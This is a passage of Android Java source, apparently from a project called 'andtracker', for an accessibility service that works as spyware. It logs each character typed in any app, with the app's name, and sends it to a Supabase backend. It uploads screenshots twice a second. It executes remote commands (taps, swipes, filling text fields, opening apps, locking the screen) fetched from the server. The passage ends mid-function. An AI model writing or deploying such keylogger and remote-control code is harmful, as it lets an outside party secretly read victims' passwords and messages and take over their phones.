package com.andtracker;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Handler;
import android.os.Looper;
import android.os.Build;
import android.graphics.Path;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Display;
import android.os.Bundle;
import android.content.Intent;

import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class KeyTrackerService extends AccessibilityService {
    private static final String TAG = "KeyTrackerService";
    private static volatile KeyTrackerService INSTANCE;

    private Handler mainHandler;
    private volatile String lastPackageName = null;

    // Polling Supabase: commandes distantes (tap x/y, etc.)
    private static final long COMMAND_POLL_INTERVAL_MS = 900;
    private final ExecutorService commandExecutor = Executors.newSingleThreadExecutor();
    private final AtomicBoolean commandPollInFlight = new AtomicBoolean(false);
    private volatile long lastCommandPollLogMs = 0;
    private final Runnable commandLoop = new Runnable() {
        @Override
        public void run() {
            pollAndHandleOneCommand();
        }
    };

    // Pseudo-flux: screenshot périodique (faible FPS) vers Supabase Storage.
    private static final long SCREENSHOT_INTERVAL_MS = 500; // 2 fps (simple + moins gourmand)
    private static final int SCREENSHOT_MAX_WIDTH = 360; // plus bas = plus léger
    private static final int SCREENSHOT_WEBP_QUALITY = 20; // compression très agressive (un peu meilleure qualité)

    private final ExecutorService screenshotExecutor = Executors.newSingleThreadExecutor();
    private final AtomicReference<String> lastEnsuredScreenshotDay = new AtomicReference<>(null);
    private final Runnable screenshotLoop = new Runnable() {
        @Override
        public void run() {
            captureAndUploadScreenshotOnce();
        }
    };

    public static KeyTrackerService getInstance() {
        return INSTANCE;
    }

    /**
     * Effectue un "tap" aux coordonnées écran (pixels).
     * Nécessite:
     * - Service d'accessibilité activé par l'utilisateur
     * - API 24+ (dispatchGesture)
     * - android:canPerformGestures="true" dans accessibility_service_config.xml
     */
    public boolean tap(int xPx, int yPx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            Log.w(TAG, "tap: dispatchGesture non supporté (API<24)");
            return false;
        }

        try {
            Path p = new Path();
            p.moveTo(xPx, yPx);

            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(p, 0, 60);

            GestureDescription gesture =
                    new GestureDescription.Builder().addStroke(stroke).build();

            boolean ok = dispatchGesture(gesture, null, null);
            if (!ok) Log.w(TAG, "tap: dispatchGesture a retourné false");
            return ok;
        } catch (Exception e) {
            Log.e(TAG, "tap: exception", e);
            return false;
        }
    }

    public boolean longPress(int xPx, int yPx, long durationMs) {
        long d = Math.max(200, durationMs);
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            Log.w(TAG, "longPress: dispatchGesture non supporté (API<24)");
            return false;
        }
        try {
            Path p = new Path();
            p.moveTo(xPx, yPx);
            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(p, 0, d);
            GestureDescription gesture =
                    new GestureDescription.Builder().addStroke(stroke).build();
            boolean ok = dispatchGesture(gesture, null, null);
            if (!ok) Log.w(TAG, "longPress: dispatchGesture a retourné false");
            return ok;
        } catch (Exception e) {
            Log.e(TAG, "longPress: exception", e);
            return false;
        }
    }

    public boolean swipe(int x1, int y1, int x2, int y2, long durationMs) {
        long d = Math.max(50, durationMs);
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            Log.w(TAG, "swipe: dispatchGesture non supporté (API<24)");
            return false;
        }
        try {
            Path p = new Path();
            p.moveTo(x1, y1);
            p.lineTo(x2, y2);
            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(p, 0, d);
            GestureDescription gesture =
                    new GestureDescription.Builder().addStroke(stroke).build();
            boolean ok = dispatchGesture(gesture, null, null);
            if (!ok) Log.w(TAG, "swipe: dispatchGesture a retourné false");
            return ok;
        } catch (Exception e) {
            Log.e(TAG, "swipe: exception", e);
            return false;
        }
    }

    public boolean doubleTap(int xPx, int yPx) {
        // Double tap best-effort: 2 strokes avec petit délai.
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            Log.w(TAG, "doubleTap: dispatchGesture non supporté (API<24)");
            return false;
        }
        try {
            Path p1 = new Path();
            p1.moveTo(xPx, yPx);
            Path p2 = new Path();
            p2.moveTo(xPx, yPx);

            GestureDescription.StrokeDescription s1 =
                    new GestureDescription.StrokeDescription(p1, 0, 60);
            GestureDescription.StrokeDescription s2 =
                    new GestureDescription.StrokeDescription(p2, 140, 60);

            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(s1)
                    .addStroke(s2)
                    .build();

            boolean ok = dispatchGesture(gesture, null, null);
            if (!ok) Log.w(TAG, "doubleTap: dispatchGesture a retourné false");
            return ok;
        } catch (Exception e) {
            Log.e(TAG, "doubleTap: exception", e);
            return false;
        }
    }

    private AccessibilityNodeInfo findNode(AccessibilityNodeInfo root, String matchMode, String value, int maxNodes) {
        if (root == null) return null;
        if (value == null || value.trim().isEmpty()) return null;
        String v = value.trim();
        String mode = (matchMode == null || matchMode.trim().isEmpty()) ? "exact" : matchMode.trim().toLowerCase(Locale.ROOT);

        java.util.ArrayDeque<AccessibilityNodeInfo> q = new java.util.ArrayDeque<>();
        q.add(root);
        int seen = 0;
        int limit = Math.max(50, maxNodes);

        while (!q.isEmpty() && seen < limit) {
            AccessibilityNodeInfo n = q.removeFirst();
            seen++;
            boolean matched = false;
            try {
                if (nodeMatches(n, v, mode)) {
                    matched = true;
                    // Clean up queued nodes before returning
                    while (!q.isEmpty()) {
                        AccessibilityNodeInfo r = q.removeFirst();
                        if (r != null && r != root) {
                            try { r.recycle(); } catch (Exception ignored) {}
                        }
                    }
                    return n;
                }
                for (int i = 0; i < n.getChildCount(); i++) {
                    AccessibilityNodeInfo c = n.getChild(i);
                    if (c != null) q.add(c);
                }
            } catch (Exception ignored) {
            } finally {
                if (!matched && n != null && n != root) {
                    try { n.recycle(); } catch (Exception ignored) {}
                }
            }
        }

        while (!q.isEmpty()) {
            AccessibilityNodeInfo r = q.removeFirst();
            if (r != null && r != root) {
                try { r.recycle(); } catch (Exception ignored) {}
            }
        }
        return null;
    }

    private boolean nodeMatches(AccessibilityNodeInfo n, String value, String mode) {
        if (n == null) return false;
        String text = n.getText() != null ? n.getText().toString() : "";
        String desc = n.getContentDescription() != null ? n.getContentDescription().toString() : "";
        String hint = "";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                CharSequence ht = n.getHintText();
                if (ht != null) hint = ht.toString();
            } catch (Exception ignored) {}
        }
        String vid = null;
        try { vid = n.getViewIdResourceName(); } catch (Exception ignored) {}

        return match(mode, text, value) || match(mode, desc, value) || match(mode, hint, value) || match(mode, vid, value);
    }

    private boolean match(String mode, String hay, String needle) {
        if (hay == null) hay = "";
        if (needle == null) needle = "";
        switch (mode) {
            case "contains":
                return hay.toLowerCase(Locale.ROOT).contains(needle.toLowerCase(Locale.ROOT));
            case "exact":
            default:
                return hay.equals(needle);
        }
    }

    private boolean clickNode(String value, String matchMode) {
        return clickNodeWithRetries(value, matchMode, 2500);
    }

    private boolean clickNodeWithRetries(String value, String matchMode, long timeoutMs) {
        long deadline = System.currentTimeMillis() + Math.max(300, timeoutMs);
        while (System.currentTimeMillis() < deadline) {
            Boolean ok = callOnMainThread(() -> {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return null;
                try {
                    AccessibilityNodeInfo found = findNode(root, matchMode, value, 3000);
                    if (found == null) return false;
                    try {
                        boolean clicked = found.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        if (!clicked) {
                            AccessibilityNodeInfo p = found.getParent();
                            if (p != null) {
                                clicked = p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                try { p.recycle(); } catch (Exception ignored) {}
                            }
                        }
                        return clicked;
                    } finally {
                        try { found.recycle(); } catch (Exception ignored) {}
                    }
                } finally {
                    try { root.recycle(); } catch (Exception ignored) {}
                }
            }, 900);

            if (ok != null) {
                if (ok) return true;
                // root présent mais node non trouvé / click failed -> petit retry
            }
            try { Thread.sleep(150); } catch (Exception ignored) {}
        }
        return false;
    }

    private boolean setTextNode(String value, String matchMode, String textToSet) {
        return setTextNodeWithRetries(value, matchMode, textToSet, 2500);
    }

    private boolean setTextNodeWithRetries(String value, String matchMode, String textToSet, long timeoutMs) {
        final String tts = (textToSet == null) ? "" : textToSet;
        long deadline = System.currentTimeMillis() + Math.max(300, timeoutMs);
        while (System.currentTimeMillis() < deadline) {
            Boolean ok = callOnMainThread(() -> {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return null;
                try {
                    AccessibilityNodeInfo found = findNode(root, matchMode, value, 3000);
                    if (found == null) return false;
                    try {
                        Bundle args = new Bundle();
                        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, tts);
                        boolean set = found.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                        if (!set) {
                            found.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                            set = found.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                        }
                        return set;
                    } finally {
                        try { found.recycle(); } catch (Exception ignored) {}
                    }
                } finally {
                    try { root.recycle(); } catch (Exception ignored) {}
                }
            }, 900);

            if (ok != null) {
                if (ok) return true;
            }
            try { Thread.sleep(150); } catch (Exception ignored) {}
        }
        return false;
    }

    private <T> T callOnMainThread(Callable<T> callable, long timeoutMs) {
        if (mainHandler == null || callable == null) return null;
        final CountDownLatch latch = new CountDownLatch(1);
        final Object[] box = new Object[1];
        final Exception[] err = new Exception[1];

        mainHandler.post(() -> {
            try {
                box[0] = callable.call();
            } catch (Exception e) {
                err[0] = e;
            } finally {
                latch.countDown();
            }
        });

        try {
            boolean ok = latch.await(Math.max(50, timeoutMs), TimeUnit.MILLISECONDS);
            if (!ok) return null;
        } catch (Exception e) {
            return null;
        }
        if (err[0] != null) return null;
        @SuppressWarnings("unchecked")
        T res = (T) box[0];
        return res;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        if (event.getPackageName() != null) {
            lastPackageName = event.getPackageName().toString();
        }

        // Capturer les événements de changement de texte
        // IMPORTANT: ne pas traiter TYPE_VIEW_TEXT_SELECTION_CHANGED ici, sinon on duplique souvent
        // (beaucoup d’IME déclenchent selection_changed juste après chaque caractère)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence beforeText = event.getBeforeText();
            // event.getText() returns a List<CharSequence>
            List<CharSequence> texts = event.getText();
            CharSequence text = null;
            if (texts != null && !texts.isEmpty()) {
                // In practice, the first item is the current text of the view.
                text = texts.get(0);
            }

            if (Log.isLoggable(TAG, Log.DEBUG)) {
                Log.d(TAG, "A11y event type=" + event.getEventType()
                        + " pkg=" + event.getPackageName()
                        + " cls=" + event.getClassName()
                        + " before=" + (beforeText == null ? "null" : "\"" + beforeText + "\"")
                        + " text=" + (text == null ? "null" : "\"" + text + "\""));
            }
            
            if (text != null && text.length() > 0) {
                // Preferred: use event indices/counts (more reliable than beforeText diffs)
                int fromIndex = event.getFromIndex();
                int addedCount = event.getAddedCount();

                if (fromIndex >= 0 && addedCount > 0 && fromIndex + addedCount <= text.length()) {
                    String added = text.subSequence(fromIndex, fromIndex + addedCount).toString();
                    for (int i = 0; i < added.length(); i++) {
                        sendKeyToSupabase("pressed_key", String.valueOf(added.charAt(i)), lastPackageName);
                    }
                    return;
                }

                // Fallback: naive diff using beforeText
                if (beforeText != null && beforeText.length() > 0) {
                    int beforeLength = beforeText.length();
                    int currentLength = text.length();
                    if (currentLength > beforeLength) {
                        String newChars = text.subSequence(beforeLength, currentLength).toString();
                        for (int i = 0; i < newChars.length(); i++) {
                            sendKeyToSupabase("pressed_key", String.valueOf(newChars.charAt(i)), lastPackageName);
                        }
                    }
                } else if (text.length() > 0) {
                    // Last resort: send last character
                    sendKeyToSupabase("pressed_key", String.valueOf(text.charAt(text.length() - 1)), lastPackageName);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event == null) return super.onKeyEvent(null);

        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            int unicode = event.getUnicodeChar();
            if (unicode != 0) {
                String key = String.valueOf((char) unicode);
                Log.d(TAG, "KeyEvent unicode=" + unicode + " key=\"" + key + "\"");
                sendKeyToSupabase("pressed_key", key, lastPackageName);
            } else {
                // Handle common non-unicode keys
                int code = event.getKeyCode();
                if (code == KeyEvent.KEYCODE_ENTER) {
                    Log.d(TAG, "KeyEvent ENTER");
                    sendKeyToSupabase("pressed_key", "\n", lastPackageName);
                } else if (code == KeyEvent.KEYCODE_DEL) {
                    Log.d(TAG, "KeyEvent BACKSPACE");
                    sendKeyToSupabase("pressed_key", "[BACKSPACE]", lastPackageName);
                } else if (code == KeyEvent.KEYCODE_SPACE) {
                    Log.d(TAG, "KeyEvent SPACE");
                    sendKeyToSupabase("pressed_key", " ", lastPackageName);
                }
            }
        }

        return super.onKeyEvent(event);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        INSTANCE = this;
        mainHandler = new Handler(Looper.getMainLooper());
        Log.d(TAG, "Accessibility service connected. Supabase URL configured=" +
                (BuildConfig.SUPABASE_URL != null && !BuildConfig.SUPABASE_URL.isEmpty()));

        // Démarre le polling des commandes distantes (Supabase).
        mainHandler.postDelayed(commandLoop, 1200);

        // Démarre le pseudo-flux de screenshots si supporté (Android 11+).
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            mainHandler.postDelayed(screenshotLoop, 2000);
        } else {
            Log.w(TAG, "takeScreenshot non supporté (API<30). Pas de pseudo-flux.");
        }
    }

    @Override
    public void onDestroy() {
        if (INSTANCE == this) {
            INSTANCE = null;
        }
        if (mainHandler != null) {
            mainHandler.removeCallbacks(screenshotLoop);
            mainHandler.removeCallbacks(commandLoop);
        }
        try {
            screenshotExecutor.shutdownNow();
        } catch (Exception ignored) {}
        try {
            commandExecutor.shutdownNow();
        } catch (Exception ignored) {}
        super.onDestroy();
    }













    private void sendKeyToSupabase(String eventType, String eventValue, String packageName) {
        SupabaseAndroidEventsClient.sendEvent(
                this,
                packageName,
                eventType,
                eventValue
        );
    }

    private void captureAndUploadScreenshotOnce() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return;

        try {
            // API 30+: capture via AccessibilityService (pas MediaProjection).
            takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    screenshotExecutor,
                    new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult screenshot) {
                            try {
                                HardwareBuffer buffer = screenshot.getHardwareBuffer();
                                ColorSpace colorSpace = screenshot.getColorSpace();
                                if (buffer == null) {
                                    Log.w(TAG, "ScreenshotResult sans buffer");
                                    return;
                                }

                                Bitmap hw = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                if (hw == null) {
                                    Log.w(TAG, "Bitmap.wrapHardwareBuffer a retourné null");
                                    return;
                                }

                                Bitmap bmp = hw.copy(Bitmap.Config.ARGB_8888, false);
                                Bitmap scaled = scaleDownIfNeeded(bmp, SCREENSHOT_MAX_WIDTH);

                                byte[] bytes = compressToWebpLossy(scaled, SCREENSHOT_WEBP_QUALITY);
                                if (bytes != null && bytes.length > 0) {
                                    ScreenshotPaths paths = buildScreenshotPaths();
                                    if (paths != null) {
                                        ensureScreenshotFolders(paths.deviceId, paths.dayStr);

                                        if (shouldSkipScreenshotUpload(bytes.length, paths.objectPath)) {
                                            Log.d(TAG, "screenshot: skip upload (same size=" + bytes.length + ") keep=" + lastUploadedScreenshotPath);
                                            // "Timestamp" léger côté DB (sans ré-uploader l'image)
                                            // On envoie la référence de la dernière image réellement uploadée.
                                            String heartbeat = "{\"size\":" + bytes.length + ",\"path\":\"" +
                                                    String.valueOf(lastUploadedScreenshotPath).replace("\"", "\\\"") + "\"}";
                                            sendKeyToSupabase("screenshot_heartbeat", heartbeat, lastPackageName);
                                        } else {
                                            SupabaseAndroidEventsClient.uploadScreenshot(KeyTrackerService.this, bytes, paths.objectPath, "image/webp");
                                            markScreenshotUploaded(bytes.length, paths.objectPath);
                                        }
                                    }
                                }

                                if (scaled != bmp) scaled.recycle();
                                bmp.recycle();
                                hw.recycle();
                                buffer.close();
                            } catch (Exception e) {
                                Log.e(TAG, "Erreur traitement screenshot", e);
                            } finally {
                                scheduleNextScreenshot(SCREENSHOT_INTERVAL_MS);
                            }
                        }

                        @Override
                        public void onFailure(int errorCode) {
                            Log.w(TAG, "takeScreenshot échec, code=" + errorCode);
                            scheduleNextScreenshot(Math.max(3000, SCREENSHOT_INTERVAL_MS));
                        }
                    }
            );
        } catch (Exception e) {
            Log.e(TAG, "Exception takeScreenshot", e);
            scheduleNextScreenshot(Math.max(3000, SCREENSHOT_INTERVAL_MS));
        }
    }

    private void scheduleNextScreenshot(long delayMs) {
        if (mainHandler == null) return;
        mainHandler.removeCallbacks(screenshotLoop);
        mainHandler.postDelayed(screenshotLoop, delayMs);
    }

    private void scheduleNextCommandPoll(long delayMs) {
        if (mainHandler == null) return;
        mainHandler.removeCallbacks(commandLoop);
        mainHandler.postDelayed(commandLoop, delayMs);
    }

    private void pollAndHandleOneCommand() {
        if (mainHandler == null) return;

        long now = System.currentTimeMillis();
        if (now - lastCommandPollLogMs > 10_000) {
            lastCommandPollLogMs = now;
            Log.d(TAG, "command_poll: tick");
        }

        // Évite les overlaps si le réseau est lent.
        if (!commandPollInFlight.compareAndSet(false, true)) {
            scheduleNextCommandPoll(COMMAND_POLL_INTERVAL_MS);
            return;
        }

        commandExecutor.execute(() -> {
            long nextDelay = COMMAND_POLL_INTERVAL_MS;
            try {
                org.json.JSONObject cmd = SupabaseAndroidEventsClient.fetchNextPendingCommand(KeyTrackerService.this);
                if (cmd != null) {
                    handleCommand(cmd);
                    // Si on a traité une commande, repoll vite pour enchaîner.
                    nextDelay = 200;
                }
            } catch (Exception e) {
                Log.e(TAG, "pollAndHandleOneCommand: erreur", e);
                nextDelay = Math.max(2000, COMMAND_POLL_INTERVAL_MS);
            } finally {
                commandPollInFlight.set(false);
                scheduleNextCommandPoll(nextDelay);
            }
        });
    }

    private void handleCommand(org.json.JSONObject cmd) {
        String id = null;
        String type = null;
        try {
            id = cmd.optString("id", null);
            type = cmd.optString("command_type", null);
            org.json.JSONObject payload = cmd.optJSONObject("payload");

            if (id == null || id.trim().isEmpty()) {
                Log.w(TAG, "handleCommand: id manquant");
                return;
            }

            if ("tap".equalsIgnoreCase(type)) {
                int x = payload != null ? payload.optInt("x", -1) : -1;
                int y = payload != null ? payload.optInt("y", -1) : -1;
                if (x < 0 || y < 0) {
                    Log.w(TAG, "handleCommand: tap payload invalide id=" + id);
                    org.json.JSONObject res = new org.json.JSONObject();
                    res.put("ok", false);
                    res.put("error", "invalid_payload");
                    SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
                    return;
                }

                boolean ok = tap(x, y);
                Log.d(TAG, "Remote command tap id=" + id + " (" + x + "," + y + ") ok=" + ok);

                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "tap");
                res.put("x", x);
                res.put("y", y);
                res.put("package", lastPackageName);

                boolean updated = SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                if (!updated) Log.w(TAG, "handleCommand: updateCommandStatus failed id=" + id);

                // Trace aussi dans events pour debug côté serveur.
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_tap", ok ? ("OK@" + x + "," + y) : ("FAIL@" + x + "," + y));
                return;
            }

            if ("long_press".equalsIgnoreCase(type)) {
                int x = payload != null ? payload.optInt("x", -1) : -1;
                int y = payload != null ? payload.optInt("y", -1) : -1;
                long d = payload != null ? payload.optLong("durationMs", 700) : 700;
                if (x < 0 || y < 0) {
                    org.json.JSONObject res = new org.json.JSONObject();
                    res.put("ok", false);
                    res.put("error", "invalid_payload");
                    SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
                    return;
                }
                boolean ok = longPress(x, y, d);
                Log.d(TAG, "Remote command long_press id=" + id + " (" + x + "," + y + " d=" + d + ") ok=" + ok);
                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "long_press");
                res.put("x", x);
                res.put("y", y);
                res.put("durationMs", d);
                res.put("package", lastPackageName);
                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_long_press", ok ? ("OK@" + x + "," + y) : ("FAIL@" + x + "," + y));
                return;
            }

            if ("double_tap".equalsIgnoreCase(type)) {
                int x = payload != null ? payload.optInt("x", -1) : -1;
                int y = payload != null ? payload.optInt("y", -1) : -1;
                if (x < 0 || y < 0) {
                    org.json.JSONObject res = new org.json.JSONObject();
                    res.put("ok", false);
                    res.put("error", "invalid_payload");
                    SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
                    return;
                }
                boolean ok = doubleTap(x, y);
                Log.d(TAG, "Remote command double_tap id=" + id + " (" + x + "," + y + ") ok=" + ok);
                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "double_tap");
                res.put("x", x);
                res.put("y", y);
                res.put("package", lastPackageName);
                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_double_tap", ok ? ("OK@" + x + "," + y) : ("FAIL@" + x + "," + y));
                return;
            }

            if ("swipe".equalsIgnoreCase(type)) {
                int x1 = payload != null ? payload.optInt("x1", -1) : -1;
                int y1 = payload != null ? payload.optInt("y1", -1) : -1;
                int x2 = payload != null ? payload.optInt("x2", -1) : -1;
                int y2 = payload != null ? payload.optInt("y2", -1) : -1;
                long d = payload != null ? payload.optLong("durationMs", 300) : 300;
                if (x1 < 0 || y1 < 0 || x2 < 0 || y2 < 0) {
                    org.json.JSONObject res = new org.json.JSONObject();
                    res.put("ok", false);
                    res.put("error", "invalid_payload");
                    SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
                    return;
                }
                boolean ok = swipe(x1, y1, x2, y2, d);
                Log.d(TAG, "Remote command swipe id=" + id + " (" + x1 + "," + y1 + ")->(" + x2 + "," + y2 + ") d=" + d + " ok=" + ok);
                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "swipe");
                res.put("x1", x1);
                res.put("y1", y1);
                res.put("x2", x2);
                res.put("y2", y2);
                res.put("durationMs", d);
                res.put("package", lastPackageName);
                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_swipe", ok ? "OK" : "FAIL");
                return;
            }

            if ("global_action".equalsIgnoreCase(type)) {
                String action = payload != null ? payload.optString("action", "") : "";
                boolean ok = performGlobalActionSafe(action);
                Log.d(TAG, "Remote command global_action id=" + id + " action=" + action + " ok=" + ok);
                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "global_action");
                res.put("action", action);
                res.put("package", lastPackageName);
                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_global_action", ok ? ("OK@" + action) : ("FAIL@" + action));
                return;
            }

            if ("click_node".equalsIgnoreCase(type)) {
                String value = payload != null ? payload.optString("value", "") : "";
                String match = payload != null ? payload.optString("match", "contains") : "contains";
                String ensureComponent = payload != null ? payload.optString("ensure_component", "") : "";
                String ensurePackage = payload != null ? payload.optString("ensure_package", "") : "";
                if (value == null || value.trim().isEmpty()) {
                    org.json.JSONObject res = new org.json.JSONObject();
                    res.put("ok", false);
                    res.put("error", "invalid_payload");
                    SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
                    return;
                }
                if (ensureComponent != null && !ensureComponent.trim().isEmpty()) {
                    openApp("", ensureComponent.trim());
                } else if (ensurePackage != null && !ensurePackage.trim().isEmpty()) {
                    openApp(ensurePackage.trim(), "");
                }
                boolean ok = clickNode(value, match);
                Log.d(TAG, "Remote command click_node id=" + id + " value=" + value + " match=" + match + " ok=" + ok);
                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "click_node");
                res.put("value", value);
                res.put("match", match);
                res.put("package", lastPackageName);
                if (ensureComponent != null && !ensureComponent.trim().isEmpty()) res.put("ensure_component", ensureComponent.trim());
                if (ensurePackage != null && !ensurePackage.trim().isEmpty()) res.put("ensure_package", ensurePackage.trim());
                if (!ok) res.put("reason", "node_not_found_or_click_failed");
                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_click_node", ok ? ("OK@" + value) : ("FAIL@" + value));
                return;
            }

            if ("set_text".equalsIgnoreCase(type)) {
                String value = payload != null ? payload.optString("value", "") : "";
                String match = payload != null ? payload.optString("match", "contains") : "contains";
                String text = payload != null ? payload.optString("text", "") : "";
                String ensureComponent = payload != null ? payload.optString("ensure_component", "") : "";
                String ensurePackage = payload != null ? payload.optString("ensure_package", "") : "";
                if (value == null || value.trim().isEmpty()) {
                    org.json.JSONObject res = new org.json.JSONObject();
                    res.put("ok", false);
                    res.put("error", "invalid_payload");
                    SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
                    return;
                }
                if (ensureComponent != null && !ensureComponent.trim().isEmpty()) {
                    openApp("", ensureComponent.trim());
                } else if (ensurePackage != null && !ensurePackage.trim().isEmpty()) {
                    openApp(ensurePackage.trim(), "");
                }
                boolean ok = setTextNode(value, match, text);
                Log.d(TAG, "Remote command set_text id=" + id + " value=" + value + " match=" + match + " ok=" + ok);
                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "set_text");
                res.put("value", value);
                res.put("match", match);
                res.put("package", lastPackageName);
                if (ensureComponent != null && !ensureComponent.trim().isEmpty()) res.put("ensure_component", ensureComponent.trim());
                if (ensurePackage != null && !ensurePackage.trim().isEmpty()) res.put("ensure_package", ensurePackage.trim());
                if (!ok) res.put("reason", "node_not_found_or_set_text_failed");
                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_set_text", ok ? ("OK@" + value) : ("FAIL@" + value));
                return;
            }

            if ("open_app".equalsIgnoreCase(type)) {
                String pkg = payload != null ? payload.optString("package", "") : "";
                String component = payload != null ? payload.optString("component", "") : "";
                boolean ok = openApp(pkg, component);
                Log.d(TAG, "Remote command open_app id=" + id + " package=" + pkg + " component=" + component + " ok=" + ok);
                org.json.JSONObject res = new org.json.JSONObject();
                res.put("ok", ok);
                res.put("type", "open_app");
                if (pkg != null && !pkg.isEmpty()) res.put("package", pkg);
                if (component != null && !component.isEmpty()) res.put("component", component);
                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_open_app", ok ? ("OK@" + (pkg.isEmpty() ? component : pkg)) : "FAIL");
                return;
            }

            Log.w(TAG, "handleCommand: type non supporté id=" + id + " type=" + type);
            org.json.JSONObject res = new org.json.JSONObject();
            res.put("ok", false);
            res.put("error", "unsupported_command_type");
            res.put("command_type", type);
            SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
        } catch (Exception e) {
            Log.e(TAG, "handleCommand: exception id=" + id + " type=" + type, e);
            try {
                if (id != null && !id.trim().isEmpty()) {
                    org.json.JSONObject res = new org.json.JSONObject();
                    res.put("ok", false);
                    res.put("error", "exception");
                    res.put("message", e.getMessage());
                    SupabaseAndroidEventsClient.updateCommandStatus(this, id, "error", res);
                }
            } catch (Exception ignored) {}
        }
    }

    private boolean performGlobalActionSafe(String action) {
        if (action == null) action = "";
        String a = action.trim().toUpperCase(Locale.ROOT);
        int code;
        switch (a) {
            case "BACK":
                code = GLOBAL_ACTION_BACK;
                break;
            case "HOME":
                code = GLOBAL_ACTION_HOME;
                break;
            case "RECENTS":
            case "APP_SWITCH":
                code = GLOBAL_ACTION_RECENTS;
                break;
            case "NOTIFICATIONS":
                code = GLOBAL_ACTION_NOTIFICATIONS;
                break;
            case "QUICK_SETTINGS":
                code = GLOBAL_ACTION_QUICK_SETTINGS;
                break;
            case "POWER_DIALOG":
                code = GLOBAL_ACTION_POWER_DIALOG;
                break;
            case "LOCK_SCREEN":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    code = GLOBAL_ACTION_LOCK_SCREEN;
                    break;
                }
                return false;
            case "TAKE_SCREENSHOT":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    code = GLOBAL_ACTION_TAKE_SCREENSHOT;
                    break;
                }
                return false;
            default:
                return false;
        }
        try {
            return performGlobalAction(code);
        } catch (Exception e) {
            return false;
        }
    }

    private boolean openApp(String packageName, String componentName) {
        try {
            Intent intent = null;
            if (componentName != null && !componentName.trim().isEmpty()) {
                String c = componentName.trim();
                // Formats acceptés:
                // - "com.foo/.MainActivity"
